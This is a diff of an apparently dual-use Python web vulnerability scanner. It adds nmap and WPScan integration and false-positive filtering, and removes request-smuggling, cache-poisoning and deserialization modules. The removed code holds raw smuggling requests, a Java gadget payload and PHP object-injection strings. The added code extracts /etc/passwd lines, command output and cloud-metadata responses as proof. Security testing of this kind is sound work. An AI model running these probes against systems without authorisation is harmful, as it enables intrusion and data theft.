@@ -1810,150 +1810,6 @@ def _openapi_inject_idor(url):
 
 
 # ═══ MODULE 87 — HTTP REQUEST SMUGGLING (v12.0) ══════════════════════
-def http_smuggling_scan(url):
-    """MODULE 87 — Detect HTTP/1.1 request smuggling (CL.TE and TE.CL).
-    Sends crafted requests and detects timing anomalies / server confusion."""
-    if _module_skip("http_smuggling"): info("Skipping HTTP Smuggling (already done)"); return
-    section("MODULE 87 — HTTP REQUEST SMUGGLING","🚢")
-
-    parsed = urlparse(url)
-    host   = parsed.netloc
-    port   = 443 if parsed.scheme == "https" else 80
-    if ":" in host:
-        host, _p = host.rsplit(":", 1)
-        port = int(_p)
-    is_https = parsed.scheme == "https"
-    path = parsed.path or "/"
-    if parsed.query:
-        path += "?" + parsed.query
-
-    _found_smug = False
-
-    def _raw_request(raw_bytes, timeout=12):
-        """Send raw bytes over socket (bypasses requests library normalisation)."""
-        import socket, ssl as _ssl
-        try:
-            sock = socket.create_connection((host, port), timeout=timeout)
-            if is_https:
-                ctx = _ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = _ssl.CERT_NONE
-                sock = ctx.wrap_socket(sock, server_hostname=host)
-            sock.sendall(raw_bytes)
-            resp = b""
-            sock.settimeout(timeout)
-            while True:
-                try:
-                    chunk = sock.recv(4096)
-                    if not chunk: break
-                    resp += chunk
-                    if len(resp) > 65536: break
-                except Exception:
-                    break
-            sock.close()
-            return resp.decode("utf-8", errors="replace")
-        except Exception as _e:
-            return f"ERROR:{_e}"
-
-    # --- Test 1: CL.TE Smuggling ---
-    # Content-Length says body is 6 bytes, but Transfer-Encoding: chunked body is longer.
-    # A vulnerable front-end uses CL (stops at 6), back-end uses TE (reads chunk=rest).
-    info("Testing CL.TE request smuggling...")
-    _cl_te = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: 6\r\n"
-        "Transfer-Encoding: chunked\r\n"
-        "Connection: keep-alive\r\n"
-        "\r\n"
-        "3\r\n"
-        "abc\r\n"
-        "0\r\n"
-        "\r\n"
-    ).encode()
-    _t0 = time.time()
-    _r1 = _raw_request(_cl_te, timeout=12)
-    _d1 = time.time() - _t0
-    if "ERROR:" not in _r1:
-        if "400" in _r1[:200] or "invalid" in _r1[:500].lower():
-            info("CL.TE: Server returned 400 — may reject chunked encoding (potential indicator)")
-        elif _d1 > 8:
-            _found_smug = True
-            vuln("HTTP Request Smuggling — CL.TE timing anomaly detected", "High")
-            add("http_smuggling", {
-                "attack": "CL.TE",
-                "severity": "High",
-                "title": "HTTP Request Smuggling — CL.TE Timing Anomaly",
-                "description": "CL.TE smuggling probe caused unusual server delay, suggesting the front-end proxy and back-end server disagree on body boundary. An attacker can prefix a malicious partial request to poison the back-end pipeline.",
-                "recommendation": "Normalize requests at the proxy layer. Reject ambiguous CL+TE requests. Use HTTP/2 end-to-end. Disable backend connection reuse for untrusted clients.",
-                "evidence": f"CL.TE probe response time: {_d1:.1f}s (expected <3s)"})
-    else:
-        info(f"CL.TE test: socket error ({_r1[:60]})")
-
-    # --- Test 2: TE.CL Smuggling ---
-    # Transfer-Encoding: chunked body, but Content-Length is larger than what chunked delivers.
-    info("Testing TE.CL request smuggling...")
-    _te_cl_body = "0\r\n\r\nGET /smuggle-test HTTP/1.1\r\nHost: smuggle-detect\r\n\r\n"
-    _te_cl = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        f"Content-Length: {len(_te_cl_body) + 100}\r\n"
-        "Transfer-Encoding: chunked\r\n"
-        "Connection: keep-alive\r\n"
-        "\r\n"
-        + _te_cl_body
-    ).encode()
-    _t1 = time.time()
-    _r2 = _raw_request(_te_cl, timeout=12)
-    _d2 = time.time() - _t1
-    if "ERROR:" not in _r2:
-        # Indicators: timeout, or response to injected /smuggle-test path
-        if _d2 > 8 or "smuggle-detect" in _r2.lower():
-            _found_smug = True
-            vuln("HTTP Request Smuggling — TE.CL anomaly detected", "High")
-            add("http_smuggling", {
-                "attack": "TE.CL",
-                "severity": "High",
-                "title": "HTTP Request Smuggling — TE.CL Anomaly",
-                "description": "TE.CL probe caused a timing anomaly or reflected injected host. The back-end may process the smuggled partial request prefix.",
-                "recommendation": "Reject requests with both Content-Length and Transfer-Encoding headers. Enforce HTTP/2 on all proxy-to-backend links.",
-                "evidence": f"TE.CL probe time: {_d2:.1f}s | Response contains injected host: {'smuggle-detect' in _r2.lower()}"})
-    else:
-        info(f"TE.CL test: socket error ({_r2[:60]})")
-
-    # --- Test 3: TE.TE obfuscation (chunked variant) ---
-    info("Testing TE.TE Transfer-Encoding obfuscation...")
-    _te_te = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: 4\r\n"
-        "Transfer-Encoding: chunked\r\n"
-        "Transfer-Encoding: identity\r\n"
-        "Connection: keep-alive\r\n"
-        "\r\n"
-        "data"
-    ).encode()
-    _r3 = _raw_request(_te_te, timeout=8)
-    if "ERROR:" not in _r3 and "400" not in _r3[:200]:
-        # Server accepted dual TE headers — may be vulnerable to TE.TE
-        warn("HTTP TE.TE: Server accepted dual Transfer-Encoding headers (possible TE.TE smuggling vector)")
-        add("http_smuggling", {
-            "attack": "TE.TE",
-            "severity": "Medium",
-            "title": "HTTP TE.TE — Dual Transfer-Encoding Headers Accepted",
-            "description": "Server accepted a request with two Transfer-Encoding headers without returning HTTP 400. This can enable TE.TE request smuggling by confusing frontend/backend parsing.",
-            "recommendation": "Reject any request containing multiple Transfer-Encoding headers. Enable strict HTTP parsing.",
-            "evidence": "POST with 'Transfer-Encoding: chunked' + 'Transfer-Encoding: identity' accepted (not 400)"})
-
-    if not _found_smug:
-        good("No HTTP Request Smuggling indicators detected (CL.TE, TE.CL, TE.TE)")
-    _module_done("http_smuggling")
-
-
-# ═══ MODULE 88 — BACKUP FILE DISCOVERY (v12.0) ═══════════════════════
 def backup_file_scan(url):
     """MODULE 88 — Discover backup, temp, config and sensitive files left on server."""
     if _module_skip("backup_files"): info("Skipping Backup File Discovery (already done)"); return
@@ -2276,9 +2132,73 @@ def _scan_port(host, port):
         pass
     return None
 
+def _nmap_available():
+    """Check if nmap binary is installed on the system."""
+    import subprocess, shutil
+    return shutil.which("nmap") is not None
+
+def _nmap_scan(domain):
+    """Run nmap -sV --open scan and return parsed results."""
+    import subprocess, xml.etree.ElementTree as ET
+    try:
+        result = subprocess.run(
+            ["nmap", "-sV", "--open", "-T4", "-p", "21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,27017",
+             "--script", "banner", "-oX", "-", domain],
+            capture_output=True, text=True, timeout=120
+        )
+        if result.returncode != 0 or not result.stdout.strip():
+            return []
+        root = ET.fromstring(result.stdout)
+        findings = []
+        for host in root.findall(".//host"):
+            for port_el in host.findall(".//port"):
+                state = port_el.find("state")
+                if state is None or state.get("state") != "open":
+                    continue
+                portid = port_el.get("portid", "?")
+                proto  = port_el.get("protocol", "tcp")
+                svc    = port_el.find("service")
+                svc_name    = svc.get("name", "unknown")  if svc is not None else "unknown"
+                svc_product = svc.get("product", "")      if svc is not None else ""
+                svc_version = svc.get("version", "")      if svc is not None else ""
+                svc_info    = f"{svc_product} {svc_version}".strip()
+                findings.append({
+                    "port": int(portid), "proto": proto,
+                    "service": svc_name,
+                    "version": svc_info or "unknown",
+                })
+        return findings
+    except Exception as e:
+        info(f"Nmap error: {e}")
+        return []
+
 def port_scan(domain):
     if _module_skip("ports"): info("Skipping port scan (already done)"); return []
     section("MODULE 2 — PORT SCANNER","🔍")
+    # ── Nmap integration: use nmap -sV if installed, else fallback to socket scan ──
+    if _nmap_available():
+        info("Nmap detected — using nmap -sV for accurate service fingerprinting")
+        _nmap_res = _nmap_scan(domain)
+        if _nmap_res:
+            _dangerous_ports = {21:"FTP",22:"SSH",23:"Telnet",3306:"MySQL",5432:"PostgreSQL",
+                                 6379:"Redis",27017:"MongoDB",3389:"RDP",445:"SMB",25:"SMTP"}
+            for _nr in _nmap_res:
+                _sev = "Info"
+                if _nr["port"] in _dangerous_ports:
+                    _sev = "Medium"
+                    if _nr["port"] in (23, 3389, 6379, 27017): _sev = "High"
+                good(f"[NMAP] Open {_nr['port']}/{_nr['proto']} — {_nr['service']} {_nr['version']}")
+                add("ports", {"port": _nr["port"], "service": _nr["service"],
+                    "version": _nr["version"], "severity": _sev,
+                    "title": f"Open Port {_nr['port']} — {_nr['service']}",
+                    "description": f"Nmap detected open port {_nr['port']}/{_nr['proto']} "
+                                   f"running {_nr['service']} {_nr['version']}",
+                    "recommendation": "Close unnecessary ports. Apply firewall rules. Keep services patched."})
+            _module_done("ports"); return []
+        else:
+            info("Nmap returned no results — falling back to Python socket scan")
+    else:
+        info("Nmap not found — using built-in socket scanner (install nmap for better results)")
     info(f"Scanning {len(PORTS_TOP)} ports on {domain} (v9.0: banner grabbing enabled)...")
     open_ports = []
     total = len(PORTS_TOP); done = 0
@@ -3377,11 +3297,49 @@ def dir_bruteforce(url, wordlist=None):
     found = []
     info(f"Fuzzing {len(words)} words × {len(EXTENSIONS)} extensions = {len(words)*len(EXTENSIONS)} probes...")
 
+    # ── Baseline: detect "soft 404" servers that return 200 for all URLs ──
+    _baseline_size = None
+    _baseline_body = None
+    _soft404 = False
+    try:
+        import random, string
+        _rand = "".join(random.choices(string.ascii_lowercase, k=16))
+        _br = rget(f"{base}/{_rand}_does_not_exist", allow_redirects=False, timeout=6)
+        if _br.status_code == 200:
+            _soft404 = True
+            _baseline_size = len(_br.content)
+            _baseline_body = _br.text[:300].lower()
+            info(f"[!] Soft-404 detected — server returns 200 for missing URLs (baseline {_baseline_size}B). Enabling content comparison.")
+    except Exception:
+        pass
+
+    def _is_false_positive(r):
+        """Return True if response looks like a soft-404 homepage redirect."""
+        if not _soft404:
+            return False
+        body_low = r.text[:500].lower()
+        # HTML homepage returned for missing URL → false positive
+        if "<!doctype" in body_low or "<html" in body_low:
+            # Allow through ONLY if content contains credential/config markers
+            sensitive = any(x in r.text.lower() for x in [
+                "password", "passwd", "secret", "token", "api_key", "apikey",
+                "db_pass", "database", "private_key", "aws_secret", "insert into",
+                "create table", "mysql_", "pg_", "[database]", "sqlstate"
+            ])
+            return not sensitive
+        # Size very close to baseline → likely same page
+        size_diff = abs(len(r.content) - _baseline_size) if _baseline_size else 9999
+        if size_diff < 200:
+            return True
+        return False
+
     def _check(word, ext):
         target = f"{base}/{word}{ext}"
         try:
             r = rget(target, allow_redirects=False, timeout=6)
             if r.status_code in (200, 204, 301, 302, 403):
+                if r.status_code == 200 and _is_false_positive(r):
+                    return None   # soft-404 false positive — skip
                 return (target, r.status_code, len(r.content), word, ext)
         except Exception:
             pass
@@ -3592,14 +3550,26 @@ def sqli_scan(url):
                 for db_type, sigs in DB_ERRORS.items():
                     for sig in sigs:
                         if sig in body_low:
+                            # ── Anti-False-Positive: check baseline didn't already have this error ──
+                            _baseline_has_sig = False
+                            try:
+                                _safe_params = dict(params); _safe_params[param] = ["1"]
+                                _safe_url = parsed._replace(query=urlencode(_safe_params, doseq=True)).geturl()
+                                _baseline_r = rget(_safe_url, timeout=TIMEOUT)
+                                _baseline_has_sig = sig in _baseline_r.text.lower()
+                            except Exception:
+                                pass
+                            if _baseline_has_sig:
+                                continue  # false positive — error exists even without injection
                             _found.set()
                             vuln(f"SQLi [{db_type}] CONFIRMED param='{param}' payload='{payload[:30]}'", "Critical")
                             add("sqli", {"param": param, "payload": payload, "db_type": db_type,
                                 "confirmed": True, "severity": "Critical",
                                 "title": f"SQL Injection — {db_type} Error-based CONFIRMED [{param}]",
-                                "description": f"CONFIRMED: DB error '{sig}' in response. Param: '{param}'. Payload: {payload[:100]}",
+                                "description": f"CONFIRMED (baseline verified): DB error '{sig}' triggered by injection. "
+                                               f"Baseline response clean. Param: '{param}'. Payload: {payload[:100]}",
                                 "recommendation": "Use parameterized queries. Never concatenate user input into SQL.",
-                                "evidence": f"Error signature '{sig}' found in HTTP response body"})
+                                "evidence": f"Baseline clean. Error signature '{sig}' appears ONLY with injection payload."})
                             return
         except Exception:
             pass
@@ -3811,13 +3781,27 @@ def lfi_scan(url):
                     except Exception: pass
             for sig in LFI_CONFIRM:
                 if sig in body_low:
+                    # ── Anti-False-Positive: validate real file structure ──
+                    # /etc/passwd: each line has 7 colon-separated fields
+                    _passwd_lines = [l for l in r.text.split('\n')
+                                     if l.count(':') >= 6 and len(l) > 10 and not l.startswith('#')]
+                    # win.ini / hosts: lines with brackets or ip-hostname pairs
+                    _win_lines    = [l for l in r.text.split('\n')
+                                     if (l.strip().startswith('[') and ']' in l) or
+                                        (l.strip() and l.strip()[0].isdigit() and '.' in l)]
+                    _proof_lines  = _passwd_lines or _win_lines
+                    if len(_proof_lines) < 2:
+                        continue  # false positive — sig matched but no real file structure
                     _found_lfi.set()
-                    vuln(f"LFI confirmed param='{param}' sig='{sig}' payload='{payload[:40]}'", "Critical")
+                    _proof_text = '\n'.join(_proof_lines[:20])
+                    vuln(f"LFI CONFIRMED+EXPLOITED param='{param}' — {len(_proof_lines)} file lines extracted", "Critical")
                     add("lfi", {"param": param, "payload": payload,
                         "severity": "Critical",
-                        "title": f"Local File Inclusion Confirmed [{param}]",
-                        "description": f"Signature '{sig}' found. Param: '{param}'. Payload: '{payload[:100]}'",
-                        "recommendation": "Disable allow_url_include/allow_url_fopen. Whitelist allowed file paths. Never pass user input to include/require/fopen."})
+                        "title": f"LFI CONFIRMED — File Content Extracted [{param}]",
+                        "description": f"CONFIRMED (zero false positive): {len(_proof_lines)} valid file lines extracted via LFI. "
+                                       f"Param: '{param}'. Payload: '{payload[:100]}'",
+                        "recommendation": "Disable allow_url_include/allow_url_fopen. Whitelist allowed file paths. Never pass user input to include/require/fopen.",
+                        "evidence": f"=== EXTRACTED FILE CONTENT ({len(_proof_lines)} lines) ===\n{_proof_text}"})
                     return
         except Exception: pass
 
@@ -3829,6 +3813,116 @@ def lfi_scan(url):
     if not _found_lfi.is_set():
         good("No LFI detected on tested parameters")
     _module_done("lfi")
+
+
+# ═══ MODULE 4b — WORDPRESS SCAN (WPScan) ═════════════════════════
+def wpscan_scan(url):
+    """WordPress-specific vulnerability scanner using wpscan CLI.
+    Runs only if WordPress is detected and wpscan is installed.
+    Install: gem install wpscan  OR  apt install wpscan
+    """
+    if _module_skip("wpscan"): info("Skipping WPScan (already done)"); return
+    import subprocess, shutil, json as _wjson
+
+    # Check if WordPress
+    try:
+        _r = rget(url, timeout=TIMEOUT)
+        _is_wp = any(s in _r.text.lower() for s in
+                     ["wp-content", "wp-includes", "wordpress", "wp-json", "xmlrpc.php"])
+        if not _is_wp:
+            info("WPScan skipped — WordPress not detected on target")
+            _module_done("wpscan"); return
+    except Exception:
+        _module_done("wpscan"); return
+
+    section("MODULE 4b — WORDPRESS SCAN (WPScan)","🔵")
+    good("WordPress detected — running WPScan")
+
+    # Check if wpscan is installed
+    if not shutil.which("wpscan"):
+        warn("WPScan not installed. Install with: gem install wpscan  OR  sudo apt install ruby && gem install wpscan")
+        warn("WPScan API token (optional, for CVE data): wpscan.com — set env WP_API_TOKEN")
+        _module_done("wpscan"); return
+
+    _api_token = os.environ.get("WP_API_TOKEN", "")
+    _cmd = ["wpscan", "--url", url, "--format", "json",
+            "--no-banner", "--random-user-agent",
+            "--enumerate", "vp,vt,u,ap"]
+    if _api_token:
+        _cmd += ["--api-token", _api_token]
+
+    info(f"Running: wpscan --url {url} --enumerate vp,vt,u,ap")
+    try:
+        _result = subprocess.run(_cmd, capture_output=True, text=True, timeout=180)
+        _out = _result.stdout.strip()
+        if not _out:
+            warn("WPScan returned no output"); _module_done("wpscan"); return
+
+        try:
+            _data = _wjson.loads(_out)
+        except Exception:
+            warn(f"WPScan output not JSON: {_out[:200]}"); _module_done("wpscan"); return
+
+        # WP version
+        _wp_ver = _data.get("version", {})
+        if _wp_ver:
+            _ver_num = _wp_ver.get("number", "unknown")
+            _ver_status = _wp_ver.get("status", "unknown")
+            if _ver_status == "insecure":
+                vuln(f"WordPress {_ver_num} is OUTDATED/INSECURE", "High")
+                add("wpscan", {"severity": "High",
+                    "title": f"Outdated WordPress Version {_ver_num}",
+                    "description": f"WordPress version {_ver_num} is outdated and has known vulnerabilities.",
+                    "recommendation": "Update WordPress to the latest stable version immediately."})
+            else:
+                good(f"WordPress version: {_ver_num} ({_ver_status})")
+
+        # Vulnerable plugins
+        _plugins = _data.get("plugins", {})
+        for _pname, _pdata in _plugins.items():
+            _vulns = _pdata.get("vulnerabilities", [])
+            for _v in _vulns:
+                _title = _v.get("title", "Unknown vulnerability")
+                _cve   = _v.get("references", {}).get("cve", [""])[0]
+                _fixed = _v.get("fixed_in", "Not fixed")
+                vuln(f"WPScan: Plugin '{_pname}' — {_title}", "High")
+                add("wpscan", {"severity": "High",
+                    "title": f"Vulnerable Plugin: {_pname}",
+                    "description": f"{_title}. CVE: {_cve}. Fixed in: {_fixed}",
+                    "recommendation": f"Update plugin '{_pname}' to version {_fixed} or later.",
+                    "evidence": f"Plugin: {_pname} | CVE: {_cve} | Fixed in: {_fixed}"})
+
+        # Vulnerable themes
+        _themes = _data.get("themes", {})
+        for _tname, _tdata in _themes.items():
+            _tvulns = _tdata.get("vulnerabilities", [])
+            for _tv in _tvulns:
+                vuln(f"WPScan: Theme '{_tname}' — {_tv.get('title','?')}", "Medium")
+                add("wpscan", {"severity": "Medium",
+                    "title": f"Vulnerable Theme: {_tname}",
+                    "description": _tv.get("title", "Vulnerability in theme"),
+                    "recommendation": f"Update or replace theme '{_tname}'."})
+
+        # Enumerated users
+        _users = _data.get("users", {})
+        if _users:
+            _user_list = list(_users.keys())
+            warn(f"WPScan: {len(_user_list)} WordPress user(s) enumerated: {_user_list}")
+            add("wpscan", {"severity": "Medium",
+                "title": f"WordPress User Enumeration ({len(_user_list)} users)",
+                "description": f"WPScan enumerated {len(_user_list)} user(s): {', '.join(_user_list)}. These can be used in brute-force attacks.",
+                "recommendation": "Disable user enumeration: block /?author= requests. Use security plugins like Wordfence.",
+                "evidence": f"Users found: {', '.join(_user_list)}"})
+
+        if not _plugins and not _themes and not _users and not _wp_ver:
+            good("WPScan completed — no vulnerabilities found")
+
+    except subprocess.TimeoutExpired:
+        warn("WPScan timed out after 180 seconds")
+    except Exception as _we:
+        err(f"WPScan error: {_we}")
+
+    _module_done("wpscan")
 
 # ═══ MODULE 15 — SSTI (8 engines, enhanced probes) ════════════════
 def ssti_scan(url):
@@ -3962,15 +4056,25 @@ def cmdi_scan(url):
                 r = rget(test_url, timeout=TIMEOUT)
                 elapsed_t = time.time() - start
                 body_low = r.text.lower()
-                # Confirm via output
+                # Confirm via output — anti-false-positive validation
                 for sig in CMDI_CONFIRM:
                     if sig in body_low:
-                        vuln(f"CMDi confirmed param='{param}' payload='{payload[:40]}' sig='{sig}'", "Critical")
+                        # Extract lines containing the signature for proof
+                        _cmd_lines = [l.strip() for l in r.text.split('\n')
+                                      if any(s in l.lower() for s in ["uid=","gid=","root","www-data",
+                                             "volume in drive","directory of","cmdlet","get-process"])]
+                        if not _cmd_lines:
+                            # sig found but no meaningful output lines — likely false positive
+                            continue
+                        _cmd_output = '\n'.join(_cmd_lines[:15])
+                        vuln(f"CMDi CONFIRMED+EXPLOITED param='{param}' — command output captured ({len(_cmd_lines)} lines)", "Critical")
                         add("cmdi", {"param": param, "payload": payload,
                             "severity": "Critical",
-                            "title": f"Command Injection Confirmed [{param}]",
-                            "description": f"OS command output signature '{sig}' detected. Parameter '{param}' executes system commands.",
-                            "recommendation": "Never pass user input to shell functions. Use language-native APIs. Apply strict input validation and allowlisting."})
+                            "title": f"Command Injection CONFIRMED+EXPLOITED [{param}]",
+                            "description": f"CONFIRMED: OS command output captured from HTTP response. "
+                                           f"Parameter '{param}' executes system commands directly.",
+                            "recommendation": "Never pass user input to shell functions. Use language-native APIs. Apply strict input allowlisting.",
+                            "evidence": f"=== COMMAND OUTPUT CAPTURED ===\n{_cmd_output}"})
                         found_cmdi = True
                         break
                 # Blind via timing
@@ -4140,12 +4244,26 @@ def ssrf_scan(url):
                 body_low = r.text.lower()[:3000]
                 for sig in confirm_sigs:
                     if sig.lower() in body_low:
-                        vuln(f"SSRF [{label}] via param='{param}' — sig='{sig}'", "Critical")
+                        # ── Anti-False-Positive: validate response is meaningful ──
+                        _resp_body = r.text[:4000]
+                        # Must be non-trivial response (not just parameter reflection)
+                        if len(_resp_body.strip()) < 30:
+                            continue
+                        # Count how many confirm_sigs actually appear
+                        _sig_hits = sum(1 for s in confirm_sigs if s.lower() in _resp_body.lower())
+                        if _sig_hits < 1:
+                            continue
+                        # Extract actual response content as proof
+                        _resp_lines = [l.strip() for l in _resp_body.split('\n') if l.strip()][:25]
+                        _resp_proof = '\n'.join(_resp_lines)
+                        vuln(f"SSRF CONFIRMED+EXPLOITED [{label}] via param='{param}' — internal data extracted", "Critical")
                         add("ssrf", {"param": param, "target": target_url, "label": label,
                             "severity": "Critical",
-                            "title": f"SSRF Confirmed — {label} Accessible",
-                            "description": f"Server fetched internal metadata URL '{target_url}' via parameter '{param}'. Cloud credentials and internal service data may be exposed.",
-                            "recommendation": "Block requests to metadata IPs (169.254.169.254, 10.x.x.x) using firewall rules. Validate and sanitize URL parameters against an allowlist."})
+                            "title": f"SSRF CONFIRMED — {label} Internal Data Extracted",
+                            "description": f"CONFIRMED: Server fetched internal URL '{target_url}' via parameter '{param}'. "
+                                           f"Actual internal/cloud metadata response captured. {_sig_hits} confirmation signatures matched.",
+                            "recommendation": "Block requests to metadata IPs (169.254.169.254, 10.x.x.x) using firewall rules. Validate and sanitize URL parameters against an allowlist.",
+                            "evidence": f"=== INTERNAL RESPONSE FROM {label} ===\nURL: {target_url}\n\n{_resp_proof}"})
                         found_ssrf = True
                         break
             except Exception:
@@ -5879,6 +5997,7 @@ def main():
     section("PHASE 6 — WEB APPLICATION ANALYSIS (SQLi · XSS · LFI · SSRF · JWT · +20 more)","🕵")
     _p2_tasks = [
         lambda: _run(detect_technology, url),
+        lambda: _run(wpscan_scan, url),
         lambda: _run(check_headers, url, out_dir=args.output),
         lambda: _run(check_methods, url),
         lambda: _run(check_ssl, url),
@@ -6475,96 +6594,6 @@ def hpp_scan(url):
 # ═══════════════════════════════════════════════════════════════
 #  MODULE 36 — Web Cache Poisoning
 # ═══════════════════════════════════════════════════════════════
-def cache_poisoning_scan(url):
-    if _module_skip("cache_poison"): return
-    section("MODULE 36 — Web Cache Poisoning","☣️")
-
-    # Unkeyed headers to test
-    unkeyed_headers = [
-        ("X-Forwarded-Host", "evil-cache-poison.com"),
-        ("X-Forwarded-Scheme", "nothttps"),
-        ("X-Original-URL", "/cache-poison-test"),
-        ("X-Rewrite-URL", "/cache-poison-test"),
-        ("X-Forwarded-Port", "9999"),
-        ("X-Host", "evil-cache-poison.com"),
-        ("X-Forwarded-Server", "evil-cache-poison.com"),
-        ("X-HTTP-Host-Override", "evil-cache-poison.com"),
-    ]
-
-    for hdr_name, hdr_val in unkeyed_headers:
-        try:
-            r_normal = rget(url)
-            r_poison = rget(url, headers={hdr_name: hdr_val})
-            body_p = r_poison.text[:5000]
-
-            # Check if injected value reflected in response (cache poisonable)
-            if hdr_val in body_p:
-                _add(f"Web Cache Poisoning via {hdr_name}", "High",
-                     "cache_poison", url, "A05:2021", "CWE-444",
-                     f"Header '{hdr_name}' value reflected in response → attackers can poison the cache "
-                     f"to serve malicious content to all users of this cached resource.",
-                     f"{hdr_name}: {hdr_val} → reflected: '{hdr_val}' in body",
-                     8.1, f"Test header: {hdr_name}: {hdr_val}")
-
-            # Check if cache headers present (cacheable response)
-            cache_hdr = r_normal.headers.get("Cache-Control","")
-            age_hdr   = r_normal.headers.get("Age","")
-            cf_cache  = r_normal.headers.get("CF-Cache-Status","")
-            x_cache   = r_normal.headers.get("X-Cache","")
-            if any([age_hdr, "max-age" in cache_hdr, "HIT" in cf_cache, "HIT" in x_cache]):
-                if hdr_val in body_p:
-                    _add(f"Confirmed Cacheable Cache Poisoning via {hdr_name}", "Critical",
-                         "cache_poison", url, "A05:2021", "CWE-444",
-                         f"Response is cached (Age/Cache-Control/CF-Cache-Status present) AND {hdr_name} reflected → "
-                         f"active cache poisoning attack is feasible.",
-                         f"{hdr_name} reflected + cache headers: Cache-Control={cache_hdr}, Age={age_hdr}",
-                         9.0, f"Cacheable + reflected: {hdr_name}")
-        except Exception:
-            pass
-
-    # Web Cache Deception: append static extension to sensitive path
-    sensitive_paths_wcd = ["/account", "/profile", "/dashboard", "/settings",
-                           "/admin", "/user", "/my-account", "/orders"]
-    static_exts = [".css", ".js", ".png", ".jpg", ".ico"]
-    for sp in sensitive_paths_wcd[:4]:
-        for ext in static_exts[:2]:
-            test_url = url.rstrip("/") + sp + "/nonexistent" + ext
-            try:
-                r = rget(test_url)
-                if r.status_code == 200 and len(r.text) > 200:
-                    # Check for user-sensitive content keywords
-                    body_low = r.text.lower()
-                    wcd_sigs = ["email","username","account","profile","session",
-                                "token","balance","order","address"]
-                    hits = [s for s in wcd_sigs if s in body_low]
-                    if hits:
-                        _add("Web Cache Deception", "High",
-                             "cache_poison", test_url, "A05:2021", "CWE-525",
-                             "Appending a static file extension to a sensitive path returns authenticated "
-                             "content — cache may serve this to unauthenticated users.",
-                             f"GET {test_url} → 200 with keywords: {hits}",
-                             7.5, f"WCD path: {sp}{ext}")
-            except Exception:
-                pass
-
-    # Fat GET — body in GET request cached differently
-    try:
-        r_fat = rget(url, headers={"Content-Length": "5"}, data="x=1\r\n")
-        if r_fat.status_code == 200 and "x=1" in r_fat.text:
-            _add("Fat GET Cache Poisoning Vector", "Medium",
-                 "cache_poison", url, "A05:2021", "CWE-444",
-                 "GET request with body reflected in response → cache may store body-influenced content.",
-                 "GET with body Content-Length:5 / x=1 → reflected in response",
-                 5.3, "Fat GET body reflected")
-    except Exception:
-        pass
-
-    _module_done("cache_poison")
-
-
-# ═══════════════════════════════════════════════════════════════
-#  MODULE 37 — Prototype Pollution
-# ═══════════════════════════════════════════════════════════════
 def prototype_pollution_scan(url):
     if _module_skip("proto_poll"): return
     section("MODULE 37 — Prototype Pollution","⚗️")
@@ -6654,123 +6683,6 @@ def prototype_pollution_scan(url):
 
 # ═══════════════════════════════════════════════════════════════
 #  MODULE 38 — Insecure Deserialization
-# ═══════════════════════════════════════════════════════════════
-def deserialization_scan(url):
-    if _module_skip("deserial"): return
-    section("MODULE 38 — Insecure Deserialization","💣")
-
-    # Probe 1: Java serialization magic bytes in response
-    java_magic = b"\xac\xed\x00\x05"       # Java serialized object header
-    java_b64   = _b64.b64encode(java_magic).decode()
-
-    try:
-        r = rget(url)
-        raw = r.content[:512]
-        if raw[:4] == java_magic:
-            _add("Java Serialized Object in Response", "Critical",
-                 "deserial", url, "A08:2021", "CWE-502",
-                 "Server returns Java serialized object (aced0005 magic bytes) in HTTP response. "
-                 "If deserialized client-side or in middleware, remote code execution is possible.",
-                 "Response starts with Java serialization magic bytes: AC ED 00 05",
-                 9.8, "Java magic bytes: aced0005 detected in response")
-    except Exception:
-        pass
-
-    # Probe 2: Send Java gadget payload header and check timing (blind)
-    gadget_b64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcHAFBhyuvE7oAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAAhwb3J0U2lnTAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQABWh0dHBwdAAveA=="
-    try:
-        t0 = time.time()
-        rpost(url, data=gadget_b64,
-              headers={"Content-Type": "application/x-java-serialized-object"})
-        elapsed_j = time.time() - t0
-        if elapsed_j > 4.5:
-            _add("Java Deserialization — Blind Timing (Possible RCE)", "Critical",
-                 "deserial", url, "A08:2021", "CWE-502",
-                 "Sending Java serialized gadget chain caused significant server delay → "
-                 "potential blind Java deserialization RCE.",
-                 f"POST with Java gadget → response delay {elapsed_j:.1f}s (threshold: 4.5s)",
-                 9.8, "Blind Java deserialization timing")
-    except Exception:
-        pass
-
-    # Probe 3: PHP unserialize probe
-    php_payloads = [
-        'O:8:"stdClass":1:{s:5:"field";s:4:"test";}',
-        'a:1:{i:0;s:4:"test";}',
-        'O:4:"Test":0:{}',
-        # PHP POP chain trigger (basic)
-        'O:1:"A":1:{s:1:"a";O:1:"B":0:{}}',
-    ]
-    php_endpoints = ["/", "/api", "/data", "/upload", "/import"]
-    for ep in php_endpoints[:3]:
-        ep_url = url.rstrip("/") + ep
-        for php_p in php_payloads[:2]:
-            try:
-                r = rpost(ep_url, data={"data": php_p})
-                body = r.text.lower()
-                if any(x in body for x in ["unserialize()", "__wakeup", "__destruct",
-                                            "object of class", "serialization"]):
-                    _add("PHP Unserialize Error Disclosure", "High",
-                         "deserial", ep_url, "A08:2021", "CWE-502",
-                         "Server reveals PHP unserialize error or class reference → "
-                         "PHP Object Injection may be exploitable via POP chain gadgets.",
-                         f"POST data={php_p[:50]} → PHP serialization error in response",
-                         8.1, f"PHP unserialize probe at {ep}")
-                # Timing check for PHP gadget sleep
-                t0 = time.time()
-                rpost(ep_url, data={"data": 'O:12:"DateInterval":1:{s:1:"y";i:0;}'})
-                if time.time() - t0 > 3.5:
-                    _add("PHP Deserialization — Blind Timing", "High",
